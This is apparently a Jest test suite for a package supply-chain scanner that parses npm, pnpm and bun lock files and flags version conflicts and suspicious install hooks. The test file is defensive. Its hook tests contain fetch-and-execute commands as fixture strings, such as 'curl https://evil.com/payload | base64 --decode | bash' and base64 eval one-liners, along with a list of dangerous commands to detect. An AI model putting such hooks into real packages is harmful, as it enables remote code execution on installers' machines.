import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import {
  PackageGateLockParser,
  PackageGateScanner,
  ParsedLockResult,
  ConflictFinding,
  detectVersionConflicts,
  detectSuspiciousHooks,
} from '../scanners/package-gate-scanner';
import {
  generatePackageGateReport,
  PackageGateReport,
} from '../utils/package-gate-reporter';

// ---------------------------------------------------------------------------
// Fixtures
// ---------------------------------------------------------------------------

/** Minimal npm package-lock.json v1 */
const NPM_LOCK_V1 = JSON.stringify({
  name: 'test-project',
  version: '1.0.0',
  lockfileVersion: 1,
  requires: true,
  dependencies: {
    lodash: {
      version: '4.17.21',
      resolved: 'https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz',
      integrity: 'sha512-abc123',
    },
    express: {
      version: '4.18.2',
      resolved: 'https://registry.npmjs.org/express/-/express-4.18.2.tgz',
      integrity: 'sha512-def456',
      dependencies: {
        // nested dep (hoisted conflict)
        'qs': {
          version: '6.10.3',
          resolved: 'https://registry.npmjs.org/qs/-/qs-6.10.3.tgz',
          integrity: 'sha512-ghi789',
        },
      },
    },
  },
});

/** npm package-lock.json v2 with `packages` map */
const NPM_LOCK_V2 = JSON.stringify({
  name: 'test-project',
  version: '1.0.0',
  lockfileVersion: 2,
  requires: true,
  packages: {
    '': {
      name: 'test-project',
      version: '1.0.0',
    },
    'node_modules/lodash': {
      version: '4.17.21',
      resolved: 'https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz',
      integrity: 'sha512-lodash-integrity',
    },
    'node_modules/@babel/core': {
      version: '7.22.0',
      resolved: 'https://registry.npmjs.org/@babel/core/-/core-7.22.0.tgz',
      integrity: 'sha512-babel-integrity',
    },
    'node_modules/express/node_modules/qs': {
      version: '6.9.0',
      resolved: 'https://registry.npmjs.org/qs/-/qs-6.9.0.tgz',
      integrity: 'sha512-qs-integrity',
    },
    // Same package, different version — should appear in rawVersionMap
    'node_modules/qs': {
      version: '6.11.0',
      resolved: 'https://registry.npmjs.org/qs/-/qs-6.11.0.tgz',
      integrity: 'sha512-qs-integrity-2',
    },
  },
  dependencies: {
    lodash: { version: '4.17.21' },
  },
});

/** pnpm-lock.yaml v6 snippet */
const PNPM_LOCK_V6 = `
lockfileVersion: '6.0'

settings:
  autoInstallPeers: true
  excludeLinksFromLockfile: false

dependencies:
  lodash:
    specifier: ^4.17.21
    version: 4.17.21

devDependencies:
  typescript:
    specifier: ^5.0.0
    version: 5.2.2

packages:

  /lodash@4.17.21:
    resolution: {integrity: sha512-lodash-hash, tarball: https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz}
    dev: false

  /typescript@5.2.2:
    resolution: {integrity: sha512-ts-hash, tarball: https://registry.npmjs.org/typescript/-/typescript-5.2.2.tgz}
    dev: true
`;

/** pnpm-lock.yaml v5 snippet */
const PNPM_LOCK_V5 = `
lockfileVersion: 5.4

specifiers:
  lodash: ^4.17.0
  express: ^4.18.0

dependencies:
  lodash: 4.17.21
  express: 4.18.2

packages:

  /lodash/4.17.21:
    resolution: {integrity: sha512-lodash-hash}
    dev: false

  /express/4.18.2:
    resolution: {integrity: sha512-express-hash, tarball: https://registry.npmjs.org/express/-/express-4.18.2.tgz}
    dependencies:
      qs: 6.11.0
    dev: false

  /qs/6.11.0:
    resolution: {integrity: sha512-qs-hash}
    dev: false
`;

/** pnpm-lock.yaml v9 (snapshots section) */
const PNPM_LOCK_V9 = `
lockfileVersion: '9.0'

importers:
  .:
    dependencies:
      lodash:
        specifier: ^4.17.21
        version: 4.17.21

packages:
  lodash@4.17.21:
    resolution: {integrity: sha512-lodash-hash, tarball: https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz}

snapshots:
  lodash@4.17.21: {}
`;

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe('PackageGateLockParser', () => {
  let parser: PackageGateLockParser;

  beforeAll(() => {
    parser = new PackageGateLockParser();
  });

  // -------------------------------------------------------------------------
  // npm lock — v1
  // -------------------------------------------------------------------------

  describe('parseNpmLock — v1', () => {
    let result: ParsedLockResult;

    beforeAll(() => {
      result = parser.parseNpmLock(NPM_LOCK_V1);
    });

    test('lockType is npm', () => {
      expect(result.lockType).toBe('npm');
    });

    test('extracts top-level dependencies', () => {
      const lodash = result.dependencies.find((d) => d.name === 'lodash');
      expect(lodash).toBeDefined();
      expect(lodash!.version).toBe('4.17.21');
      expect(lodash!.resolved).toBe('https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz');
      expect(lodash!.integrity).toBe('sha512-abc123');
    });

    test('extracts nested (hoisted) dependencies', () => {
      const qs = result.dependencies.find((d) => d.name === 'qs');
      expect(qs).toBeDefined();
      expect(qs!.version).toBe('6.10.3');
    });

    test('rawVersionMap contains all versions per package', () => {
      expect(result.rawVersionMap['lodash']).toContain('4.17.21');
      expect(result.rawVersionMap['express']).toContain('4.18.2');
      expect(result.rawVersionMap['qs']).toContain('6.10.3');
    });

    test('handles invalid JSON gracefully', () => {
      const r = parser.parseNpmLock('not valid json {{');
      expect(r.lockType).toBe('npm');
      expect(r.dependencies).toHaveLength(0);
      expect(r.rawVersionMap).toEqual({});
    });
  });

  // -------------------------------------------------------------------------
  // npm lock — v2
  // -------------------------------------------------------------------------

  describe('parseNpmLock — v2 (packages map)', () => {
    let result: ParsedLockResult;

    beforeAll(() => {
      result = parser.parseNpmLock(NPM_LOCK_V2);
    });

    test('lockType is npm', () => {
      expect(result.lockType).toBe('npm');
    });

    test('extracts package from node_modules path', () => {
      const lodash = result.dependencies.find((d) => d.name === 'lodash');
      expect(lodash).toBeDefined();
      expect(lodash!.version).toBe('4.17.21');
    });

    test('extracts scoped package (@babel/core)', () => {
      const babel = result.dependencies.find((d) => d.name === '@babel/core');
      expect(babel).toBeDefined();
      expect(babel!.version).toBe('7.22.0');
    });

    test('detects multiple versions of same package in rawVersionMap', () => {
      expect(result.rawVersionMap['qs']).toContain('6.9.0');
      expect(result.rawVersionMap['qs']).toContain('6.11.0');
      expect(result.rawVersionMap['qs'].length).toBe(2);
    });

    test('skips root entry (empty key)', () => {
      const rootEntry = result.dependencies.find((d) => d.name === '');
      expect(rootEntry).toBeUndefined();
    });
  });

  // -------------------------------------------------------------------------
  // pnpm lock — v6
  // -------------------------------------------------------------------------

  describe('parsePnpmLock — v6', () => {
    let result: ParsedLockResult;

    beforeAll(() => {
      result = parser.parsePnpmLock(PNPM_LOCK_V6);
    });

    test('lockType is pnpm', () => {
      expect(result.lockType).toBe('pnpm');
    });

    test('extracts packages from v6 format', () => {
      // v6 uses "/name@version:" keys - currently parsed via v5 path since starts with /
      // The parser should extract lodash and typescript
      const names = result.dependencies.map((d) => d.name);
      expect(names).toContain('lodash');
      expect(names).toContain('typescript');
    });

    test('extracts version correctly', () => {
      const lodash = result.dependencies.find((d) => d.name === 'lodash');
      expect(lodash).toBeDefined();
      expect(lodash!.version).toBe('4.17.21');
    });

    test('extracts typescript version', () => {
      const ts = result.dependencies.find((d) => d.name === 'typescript');
      expect(ts).toBeDefined();
      expect(ts!.version).toBe('5.2.2');
    });

    test('populates rawVersionMap', () => {
      expect(result.rawVersionMap['lodash']).toContain('4.17.21');
      expect(result.rawVersionMap['typescript']).toContain('5.2.2');
    });
  });

  // -------------------------------------------------------------------------
  // pnpm lock — v5
  // -------------------------------------------------------------------------

  describe('parsePnpmLock — v5', () => {
    let result: ParsedLockResult;

    beforeAll(() => {
      result = parser.parsePnpmLock(PNPM_LOCK_V5);
    });

    test('lockType is pnpm', () => {
      expect(result.lockType).toBe('pnpm');
    });

    test('extracts packages from v5 /name/version format', () => {
      const names = result.dependencies.map((d) => d.name);
      expect(names).toContain('lodash');
      expect(names).toContain('express');
      expect(names).toContain('qs');
    });

    test('extracts version from v5 path format', () => {
      const lodash = result.dependencies.find((d) => d.name === 'lodash');
      expect(lodash!.version).toBe('4.17.21');

      const express = result.dependencies.find((d) => d.name === 'express');
      expect(express!.version).toBe('4.18.2');
    });

    test('populates rawVersionMap for all packages', () => {
      expect(result.rawVersionMap['lodash']).toEqual(['4.17.21']);
      expect(result.rawVersionMap['qs']).toEqual(['6.11.0']);
    });
  });

  // -------------------------------------------------------------------------
  // pnpm lock — v9
  // -------------------------------------------------------------------------

  describe('parsePnpmLock — v9 (snapshots section)', () => {
    let result: ParsedLockResult;

    beforeAll(() => {
      result = parser.parsePnpmLock(PNPM_LOCK_V9);
    });

    test('lockType is pnpm', () => {
      expect(result.lockType).toBe('pnpm');
    });

    test('extracts lodash from packages block', () => {
      const lodash = result.dependencies.find((d) => d.name === 'lodash');
      expect(lodash).toBeDefined();
      expect(lodash!.version).toBe('4.17.21');
    });

    test('does not duplicate entries from snapshots block', () => {
      const allLodash = result.dependencies.filter((d) => d.name === 'lodash');
      // May appear once or twice (packages + snapshots) — rawVersionMap must deduplicate
      expect(result.rawVersionMap['lodash']).toEqual(['4.17.21']);
    });
  });

  // -------------------------------------------------------------------------
  // pnpm empty / malformed
  // -------------------------------------------------------------------------

  describe('parsePnpmLock — edge cases', () => {
    test('returns empty result for empty content', () => {
      const r = parser.parsePnpmLock('');
      expect(r.lockType).toBe('pnpm');
      expect(r.dependencies).toHaveLength(0);
    });

    test('returns empty result for yaml without packages', () => {
      const r = parser.parsePnpmLock('lockfileVersion: 6.0\n\ndependencies:\n  foo:\n    specifier: ^1.0.0\n    version: 1.0.0\n');
      expect(r.lockType).toBe('pnpm');
      expect(r.dependencies).toHaveLength(0);
    });
  });

  // -------------------------------------------------------------------------
  // bun lock — ASCII extraction
  // -------------------------------------------------------------------------

  describe('parseBunLock', () => {
    test('lockType is bun', () => {
      const r = parser.parseBunLock('');
      expect(r.lockType).toBe('bun');
    });

    test('extracts package@version tokens from ASCII content', () => {
      // Simulate ASCII-readable section of bun.lockb
      const fakeContent = '\x00\x00lodash@4.17.21\x00\x00express@4.18.2\x00react@18.2.0\x00\x00';
      const r = parser.parseBunLock(fakeContent);
      const names = r.dependencies.map((d) => d.name);
      expect(names).toContain('lodash');
      expect(names).toContain('express');
      expect(names).toContain('react');
    });

    test('extracts scoped packages', () => {
      const fakeContent = 'some text @babel/core@7.22.0 more text @types/node@18.0.0';
      const r = parser.parseBunLock(fakeContent);
      const names = r.dependencies.map((d) => d.name);
      expect(names).toContain('@babel/core');
      expect(names).toContain('@types/node');
    });

    test('deduplicates repeated entries', () => {
      const fakeContent = 'lodash@4.17.21 lodash@4.17.21 lodash@4.17.21';
      const r = parser.parseBunLock(fakeContent);
      const lodashEntries = r.dependencies.filter((d) => d.name === 'lodash');
      expect(lodashEntries).toHaveLength(1);
    });

    test('builds rawVersionMap from bun content', () => {
      const fakeContent = 'foo@1.0.0 foo@2.0.0 bar@3.0.0';
      const r = parser.parseBunLock(fakeContent);
      expect(r.rawVersionMap['foo']).toContain('1.0.0');
      expect(r.rawVersionMap['foo']).toContain('2.0.0');
      expect(r.rawVersionMap['bar']).toContain('3.0.0');
    });
  });
});

// ---------------------------------------------------------------------------
// detectVersionConflicts — Phase 2 unit tests
// ---------------------------------------------------------------------------

describe('detectVersionConflicts', () => {
  // -------------------------------------------------------------------------
  // multi-version
  // -------------------------------------------------------------------------

  describe('multi-version', () => {
    test('detects when same package has 2+ different versions', () => {
      const result: ParsedLockResult = {
        lockType: 'npm',
        dependencies: [],
        rawVersionMap: {
          qs: ['6.9.0', '6.11.0'],
          lodash: ['4.17.21'],
        },
      };

      const findings = detectVersionConflicts(result);
      const multiVersion = findings.filter((f) => f.conflictType === 'multi-version');
      expect(multiVersion).toHaveLength(1);
      expect(multiVersion[0].packageName).toBe('qs');
      expect(multiVersion[0].severity).toBe('medium');
      expect(multiVersion[0].versions).toContain('6.9.0');
      expect(multiVersion[0].versions).toContain('6.11.0');
    });

    test('does NOT flag single-version packages as multi-version', () => {
      const result: ParsedLockResult = {
        lockType: 'npm',
        dependencies: [],
        rawVersionMap: {
          lodash: ['4.17.21'],
        },
      };

      const findings = detectVersionConflicts(result);
      const multiVersion = findings.filter((f) => f.conflictType === 'multi-version');
      expect(multiVersion).toHaveLength(0);
    });

    test('includes all versions in the finding', () => {
      const result: ParsedLockResult = {
        lockType: 'npm',
        dependencies: [],
        rawVersionMap: {
          react: ['16.0.0', '17.0.2', '18.2.0'],
        },
      };

      const findings = detectVersionConflicts(result);
      const mf = findings.find(
        (f) => f.conflictType === 'multi-version' && f.packageName === 'react',
      );
      expect(mf).toBeDefined();
      expect(mf!.versions).toHaveLength(3);
    });
  });

  // -------------------------------------------------------------------------
  // suspicious-version
  // -------------------------------------------------------------------------

  describe('suspicious-version', () => {
    test('flags version with -beta suffix', () => {
      const result: ParsedLockResult = {
        lockType: 'npm',
        dependencies: [],
        rawVersionMap: { foo: ['1.0.0-beta'] },
      };
      const findings = detectVersionConflicts(result);
      const sv = findings.filter((f) => f.conflictType === 'suspicious-version');
      expect(sv).toHaveLength(1);
      // Severity downgraded from 'high' → 'medium' (noise-reduction: pre-release is common in dev)
      expect(sv[0].severity).toBe('medium');
      expect(sv[0].versions).toContain('1.0.0-beta');
    });

    test('flags version with -alpha suffix', () => {
      const result: ParsedLockResult = {
        lockType: 'npm',
        dependencies: [],
        rawVersionMap: { bar: ['2.0.0-alpha.1'] },
      };
      const findings = detectVersionConflicts(result);
      const sv = findings.filter((f) => f.conflictType === 'suspicious-version');
      expect(sv).toHaveLength(1);
    });

    test('flags version with -rc suffix', () => {
      const result: ParsedLockResult = {
        lockType: 'npm',
        dependencies: [],
        rawVersionMap: { baz: ['3.1.0-rc.2'] },
      };
      const findings = detectVersionConflicts(result);
      const sv = findings.filter((f) => f.conflictType === 'suspicious-version');
      expect(sv).toHaveLength(1);
    });

    test('flags version with -dev suffix', () => {
      const result: ParsedLockResult = {
        lockType: 'npm',
        dependencies: [],
        rawVersionMap: { qux: ['0.9.0-dev'] },
      };
      const findings = detectVersionConflicts(result);
      const sv = findings.filter((f) => f.conflictType === 'suspicious-version');
      expect(sv).toHaveLength(1);
    });

    test('flags true placeholder version 0.0.0', () => {
      // Only "0.0.0" (all-zero) is flagged — normal releases like 2.0.0 are NOT suspicious
      const result: ParsedLockResult = {
        lockType: 'npm',
        dependencies: [],
        rawVersionMap: { placeholder: ['0.0.0'] },
      };
      const findings = detectVersionConflicts(result);
      const sv = findings.filter((f) => f.conflictType === 'suspicious-version');
      expect(sv).toHaveLength(1);
      expect(sv[0].packageName).toBe('placeholder');
    });

    test('does NOT flag normal major releases like 2.0.0 as suspicious', () => {
      // Previously /\\.0\\.0$/ caused massive false positives on 2.0.0, 10.0.0 etc.
      const result: ParsedLockResult = {
        lockType: 'npm',
        dependencies: [],
        rawVersionMap: { realrelease: ['2.0.0'] },
      };
      const findings = detectVersionConflicts(result);
      const sv = findings.filter((f) => f.conflictType === 'suspicious-version');
      expect(sv).toHaveLength(0);
    });

    test('does NOT flag normal versions like 1.2.3', () => {
      const result: ParsedLockResult = {
        lockType: 'npm',
        dependencies: [],
        rawVersionMap: { safe: ['1.2.3'] },
      };
      const findings = detectVersionConflicts(result);
      const sv = findings.filter((f) => f.conflictType === 'suspicious-version');
      expect(sv).toHaveLength(0);
    });
  });

  // -------------------------------------------------------------------------
  // pinned-mismatch
  // -------------------------------------------------------------------------

  describe('pinned-mismatch', () => {
    test('flags version that is not x.y.z semver', () => {
      const result: ParsedLockResult = {
        lockType: 'npm',
        dependencies: [],
        rawVersionMap: {
          gitpkg: ['github:owner/repo#abc1234'],
        },
      };
      const findings = detectVersionConflicts(result);
      const pm = findings.filter((f) => f.conflictType === 'pinned-mismatch');
      expect(pm).toHaveLength(1);
      expect(pm[0].severity).toBe('medium');
    });

    test('flags version with pre-release identifier (non semver x.y.z)', () => {
      const result: ParsedLockResult = {
        lockType: 'npm',
        dependencies: [],
        rawVersionMap: {
          prerelease: ['1.0.0-beta'],
        },
      };
      const findings = detectVersionConflicts(result);
      const pm = findings.filter((f) => f.conflictType === 'pinned-mismatch');
      expect(pm).toHaveLength(1);
    });

    test('does NOT flag strict x.y.z as pinned-mismatch', () => {
      const result: ParsedLockResult = {
        lockType: 'npm',
        dependencies: [],
        rawVersionMap: {
          clean: ['4.17.21'],
        },
      };
      const findings = detectVersionConflicts(result);
      const pm = findings.filter((f) => f.conflictType === 'pinned-mismatch');
      expect(pm).toHaveLength(0);
    });
  });

  // -------------------------------------------------------------------------
  // Combined / edge cases
  // -------------------------------------------------------------------------

  describe('combined detection', () => {
    test('returns empty array for empty rawVersionMap', () => {
      const result: ParsedLockResult = {
        lockType: 'npm',
        dependencies: [],
        rawVersionMap: {},
      };
      expect(detectVersionConflicts(result)).toHaveLength(0);
    });

    test('one package can generate multiple conflict types', () => {
      // beta + non-semver + .0.0 all in one package
      const result: ParsedLockResult = {
        lockType: 'npm',
        dependencies: [],
        rawVersionMap: {
          problematic: ['1.0.0', '2.0.0-beta'],
        },
      };
      const findings = detectVersionConflicts(result);
      const types = findings.map((f) => f.conflictType);
      // multi-version: ['1.0.0', '2.0.0-beta'] → yes
      expect(types).toContain('multi-version');
      // suspicious-version: '2.0.0-beta' → yes
      expect(types).toContain('suspicious-version');
      // pinned-mismatch: '2.0.0-beta' is not x.y.z → yes
      expect(types).toContain('pinned-mismatch');
    });

    test('findings include packageName for all conflict types', () => {
      const result: ParsedLockResult = {
        lockType: 'npm',
        dependencies: [],
        rawVersionMap: {
          mylib: ['1.0.0', '2.0.0-alpha'],
        },
      };
      const findings = detectVersionConflicts(result);
      for (const f of findings) {
        expect(f.packageName).toBe('mylib');
        expect(f.versions).toBeDefined();
        expect(f.versions.length).toBeGreaterThan(0);
      }
    });
  });
});

// ---------------------------------------------------------------------------
// PackageGateScanner.scan() — Phase 2 integration tests
// ---------------------------------------------------------------------------

describe('PackageGateScanner.scan()', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sentori-pkgate-test-'));
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  test('returns ScanResult with scanner name', async () => {
    const scanner = new PackageGateScanner();
    const result = await scanner.scan(tmpDir);
    expect(result.scanner).toBe('PackageGateScanner');
    expect(Array.isArray(result.findings)).toBe(true);
    expect(typeof result.duration).toBe('number');
  });

  test('returns empty findings for empty directory', async () => {
    const scanner = new PackageGateScanner();
    const result = await scanner.scan(tmpDir);
    expect(result.findings).toHaveLength(0);
    expect(result.scannedFiles).toBe(0);
  });

  test('detects multi-version conflict from npm lock file', async () => {
    // Create a package-lock.json with two versions of the same package
    const lockContent = JSON.stringify({
      name: 'test',
      version: '1.0.0',
      lockfileVersion: 2,
      packages: {
        '': { name: 'test', version: '1.0.0' },
        'node_modules/qs': {
          version: '6.11.0',
          resolved: 'https://registry.npmjs.org/qs/-/qs-6.11.0.tgz',
          integrity: 'sha512-aaa',
        },
        'node_modules/express/node_modules/qs': {
          version: '6.9.0',
          resolved: 'https://registry.npmjs.org/qs/-/qs-6.9.0.tgz',
          integrity: 'sha512-bbb',
        },
      },
    });

    fs.writeFileSync(path.join(tmpDir, 'package-lock.json'), lockContent, 'utf-8');

    const scanner = new PackageGateScanner();
    const result = await scanner.scan(tmpDir);

    expect(result.scannedFiles).toBeGreaterThanOrEqual(1);
    const multiVersionFindings = result.findings.filter((f) => f.id === 'PKGATE-001');
    expect(multiVersionFindings.length).toBeGreaterThan(0);
    expect(multiVersionFindings[0].severity).toBe('medium');
    expect(multiVersionFindings[0].file).toContain('package-lock.json');
  });

  test('detects suspicious-version (pre-release) in npm lock file', async () => {
    const lockContent = JSON.stringify({
      name: 'test',
      version: '1.0.0',
      lockfileVersion: 2,
      packages: {
        '': { name: 'test', version: '1.0.0' },
        'node_modules/shady-lib': {
          version: '1.0.0-beta.1',
          resolved: 'https://registry.npmjs.org/shady-lib/-/shady-lib-1.0.0-beta.1.tgz',
          integrity: 'sha512-ccc',
        },
      },
    });

    fs.writeFileSync(path.join(tmpDir, 'package-lock.json'), lockContent, 'utf-8');

    const scanner = new PackageGateScanner();
    const result = await scanner.scan(tmpDir);

    const suspiciousFindings = result.findings.filter((f) => f.id === 'PKGATE-002');
    expect(suspiciousFindings.length).toBeGreaterThan(0);
    // Severity reduced from 'high' to 'medium' (noise-reduction for suspicious-version)
    expect(suspiciousFindings[0].severity).toBe('medium');
  });

  test('scans findings have required fields', async () => {
    const lockContent = JSON.stringify({
      name: 'test',
      version: '1.0.0',
      lockfileVersion: 2,
      packages: {
        '': { name: 'test', version: '1.0.0' },
        'node_modules/foo': {
          version: '1.0.0-alpha',
          resolved: 'https://registry.npmjs.org/foo/-/foo-1.0.0-alpha.tgz',
          integrity: 'sha512-ddd',
        },
      },
    });

    fs.writeFileSync(path.join(tmpDir, 'package-lock.json'), lockContent, 'utf-8');

    const scanner = new PackageGateScanner();
    const result = await scanner.scan(tmpDir);

    for (const finding of result.findings) {
      expect(finding.id).toBeDefined();
      expect(finding.scanner).toBe('PackageGateScanner');
      expect(finding.severity).toBeDefined();
      expect(finding.title).toBeDefined();
      expect(finding.description).toBeDefined();
      expect(finding.file).toBeDefined();
      expect(finding.recommendation).toBeDefined();
    }
  });

  test('returns empty findings for clean lock file (all stable semver)', async () => {
    const lockContent = JSON.stringify({
      name: 'clean-project',
      version: '1.0.0',
      lockfileVersion: 2,
      packages: {
        '': { name: 'clean-project', version: '1.0.0' },
        'node_modules/lodash': {
          version: '4.17.21',
          resolved: 'https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz',
          integrity: 'sha512-eee',
        },
        'node_modules/express': {
          version: '4.18.2',
          resolved: 'https://registry.npmjs.org/express/-/express-4.18.2.tgz',
          integrity: 'sha512-fff',
        },
      },
    });

    fs.writeFileSync(path.join(tmpDir, 'package-lock.json'), lockContent, 'utf-8');

    const scanner = new PackageGateScanner();
    const result = await scanner.scan(tmpDir);

    // No conflicts expected: single versions, stable semver
    expect(result.findings).toHaveLength(0);
  });

  test('handles non-existent directory gracefully', async () => {
    const scanner = new PackageGateScanner();
    const result = await scanner.scan('/tmp/nonexistent-sentori-test-dir-xyz');
    expect(result.findings).toHaveLength(0);
    expect(result.scannedFiles).toBe(0);
  });
});

// ---------------------------------------------------------------------------
// detectSuspiciousHooks — Phase 3A unit tests
// ---------------------------------------------------------------------------

describe('detectSuspiciousHooks', () => {
  const FAKE_PATH = '/project/package.json';

  // Helper to build a minimal package.json string with the given scripts
  function makePackageJson(scripts: Record<string, string>): string {
    return JSON.stringify({ name: 'test', version: '1.0.0', scripts });
  }

  // -------------------------------------------------------------------------
  // PKGATE-010 — dangerous commands
  // -------------------------------------------------------------------------

  describe('PKGATE-010: dangerous commands (high)', () => {
    test.each(['curl', 'wget', 'bash', 'sh', 'eval', 'exec'])(
      'flags %s in postinstall',
      (cmd) => {
        const content = makePackageJson({ postinstall: `${cmd} something` });
        const findings = detectSuspiciousHooks(content, FAKE_PATH);
        const f010 = findings.filter((f) => f.id === 'PKGATE-010');
        expect(f010.length).toBeGreaterThanOrEqual(1);
        expect(f010[0].severity).toBe('high');
        expect(f010[0].file).toBe(FAKE_PATH);
      },
    );

    test('flags curl in preinstall', () => {
      const content = makePackageJson({ preinstall: 'curl https://example.com/install.sh | bash' });
      const findings = detectSuspiciousHooks(content, FAKE_PATH);
      expect(findings.some((f) => f.id === 'PKGATE-010')).toBe(true);
    });

    test('flags bash in install script', () => {
      const content = makePackageJson({ install: 'bash ./setup.sh' });
      const findings = detectSuspiciousHooks(content, FAKE_PATH);
      expect(findings.some((f) => f.id === 'PKGATE-010')).toBe(true);
    });

    test('does NOT flag a safe script with no dangerous commands', () => {
      const content = makePackageJson({ postinstall: 'node scripts/postinstall.js' });
      const findings = detectSuspiciousHooks(content, FAKE_PATH);
      const f010 = findings.filter((f) => f.id === 'PKGATE-010');
      expect(f010).toHaveLength(0);
    });

    test('does NOT flag scripts that are not install hooks', () => {
      // "test" and "build" scripts are not monitored
      const content = makePackageJson({ test: 'curl something', build: 'bash build.sh' });
      const findings = detectSuspiciousHooks(content, FAKE_PATH);
      expect(findings).toHaveLength(0);
    });
  });

  // -------------------------------------------------------------------------
  // PKGATE-011 — base64 decode (critical)
  // -------------------------------------------------------------------------

  describe('PKGATE-011: base64 decode (critical)', () => {
    test('flags base64 --decode in postinstall', () => {
      const content = makePackageJson({
        postinstall: 'echo aGVsbG8= | base64 --decode | bash',
      });
      const findings = detectSuspiciousHooks(content, FAKE_PATH);
      const f011 = findings.filter((f) => f.id === 'PKGATE-011');
      expect(f011).toHaveLength(1);
      expect(f011[0].severity).toBe('critical');
    });

    test('flags base64 -d shorthand in preinstall', () => {
      const content = makePackageJson({
        preinstall: 'echo cGF5bG9hZA== | base64 -d > /tmp/x && bash /tmp/x',
      });
      const findings = detectSuspiciousHooks(content, FAKE_PATH);
      expect(findings.some((f) => f.id === 'PKGATE-011')).toBe(true);
    });

    test('flags Buffer.from base64 in postinstall', () => {
      const content = makePackageJson({
        postinstall: 'node -e "eval(Buffer.from(\'aGVsbG8=\', \'base64\').toString())"',
      });
      const findings = detectSuspiciousHooks(content, FAKE_PATH);
      expect(findings.some((f) => f.id === 'PKGATE-011')).toBe(true);
    });

    test('flags atob() in install hook', () => {
      const content = makePackageJson({
        install: 'node -e "eval(atob(\'aGVsbG8=\'))"',
      });
      const findings = detectSuspiciousHooks(content, FAKE_PATH);
      expect(findings.some((f) => f.id === 'PKGATE-011')).toBe(true);
    });
  });

  // -------------------------------------------------------------------------
  // PKGATE-012 — external URL (high)
  // -------------------------------------------------------------------------

  describe('PKGATE-012: external URL (high)', () => {
    test('flags http:// URL in postinstall', () => {
      const content = makePackageJson({
        postinstall: 'curl http://evil.example.com/payload',
      });
      const findings = detectSuspiciousHooks(content, FAKE_PATH);
      const f012 = findings.filter((f) => f.id === 'PKGATE-012');
      expect(f012.length).toBeGreaterThanOrEqual(1);
      expect(f012[0].severity).toBe('high');
    });

    test('flags https:// URL in preinstall', () => {
      const content = makePackageJson({
        preinstall: 'wget https://cdn.example.com/setup.sh',
      });
      const findings = detectSuspiciousHooks(content, FAKE_PATH);
      expect(findings.some((f) => f.id === 'PKGATE-012')).toBe(true);
    });

    test('does NOT flag a script without URLs', () => {
      const content = makePackageJson({ postinstall: 'node scripts/setup.js' });
      const findings = detectSuspiciousHooks(content, FAKE_PATH);
      expect(findings.some((f) => f.id === 'PKGATE-012')).toBe(false);
    });
  });

  // -------------------------------------------------------------------------
  // PKGATE-013 — blank hook (info)
  // -------------------------------------------------------------------------

  describe('PKGATE-013: blank hook (info)', () => {
    test('flags whitespace-only postinstall', () => {
      const content = makePackageJson({ postinstall: '   ' });
      const findings = detectSuspiciousHooks(content, FAKE_PATH);
      const f013 = findings.filter((f) => f.id === 'PKGATE-013');
      expect(f013).toHaveLength(1);
      expect(f013[0].severity).toBe('info');
    });

    test('flags empty string postinstall', () => {
      const content = makePackageJson({ postinstall: '' });
      const findings = detectSuspiciousHooks(content, FAKE_PATH);
      expect(findings.some((f) => f.id === 'PKGATE-013')).toBe(true);
    });

    test('does NOT flag a non-empty script as blank', () => {
      const content = makePackageJson({ postinstall: 'node index.js' });
      const findings = detectSuspiciousHooks(content, FAKE_PATH);
      expect(findings.some((f) => f.id === 'PKGATE-013')).toBe(false);
    });

    test('blank hook does NOT generate other findings (PKGATE-010/012)', () => {
      const content = makePackageJson({ postinstall: '   ' });
      const findings = detectSuspiciousHooks(content, FAKE_PATH);
      expect(findings.some((f) => f.id === 'PKGATE-010')).toBe(false);
      expect(findings.some((f) => f.id === 'PKGATE-012')).toBe(false);
    });
  });

  // -------------------------------------------------------------------------
  // Multiple hooks and edge cases
  // -------------------------------------------------------------------------

  describe('multiple hooks and edge cases', () => {
    test('checks all three hook types', () => {
      const content = makePackageJson({
        preinstall: 'curl http://example.com/a',
        install: 'wget http://example.com/b',
        postinstall: 'bash run.sh',
      });
      const findings = detectSuspiciousHooks(content, FAKE_PATH);
      // Each hook generates at least one finding
      expect(findings.length).toBeGreaterThanOrEqual(3);
    });

    test('returns empty array for package.json with no scripts', () => {
      const content = JSON.stringify({ name: 'test', version: '1.0.0' });
      const findings = detectSuspiciousHooks(content, FAKE_PATH);
      expect(findings).toHaveLength(0);
    });

    test('returns empty array for invalid JSON', () => {
      const findings = detectSuspiciousHooks('not json {{', FAKE_PATH);
      expect(findings).toHaveLength(0);
    });

    test('returns empty array for clean hooks', () => {
      const content = makePackageJson({
        preinstall: 'node preflight.js',
        postinstall: 'node setup.js',
      });
      const findings = detectSuspiciousHooks(content, FAKE_PATH);
      expect(findings).toHaveLength(0);
    });

    test('all findings have required fields set', () => {
      const content = makePackageJson({
        postinstall: 'curl https://evil.com/payload | base64 -d | bash',
      });
      const findings = detectSuspiciousHooks(content, FAKE_PATH);
      for (const f of findings) {
        expect(f.id).toBeDefined();
        expect(f.scanner).toBe('PackageGateScanner');
        expect(f.severity).toBeDefined();
        expect(f.title).toBeDefined();
        expect(f.description).toBeDefined();
        expect(f.file).toBe(FAKE_PATH);
        expect(f.recommendation).toBeDefined();
      }
    });

    test('complex malicious hook triggers multiple IDs', () => {
      const content = makePackageJson({
        postinstall: 'curl https://evil.com/payload | base64 --decode | bash',
      });
      const findings = detectSuspiciousHooks(content, FAKE_PATH);
      const ids = findings.map((f) => f.id);
      expect(ids).toContain('PKGATE-010'); // curl & bash
      expect(ids).toContain('PKGATE-011'); // base64 --decode
      expect(ids).toContain('PKGATE-012'); // https://
    });
  });
});

// ---------------------------------------------------------------------------
// PackageGateScanner.scan() — Phase 3B integration tests (hooks in scan)
// ---------------------------------------------------------------------------

describe('PackageGateScanner.scan() — Phase 3B: hooks integration', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sentori-pkgate3-test-'));
  });

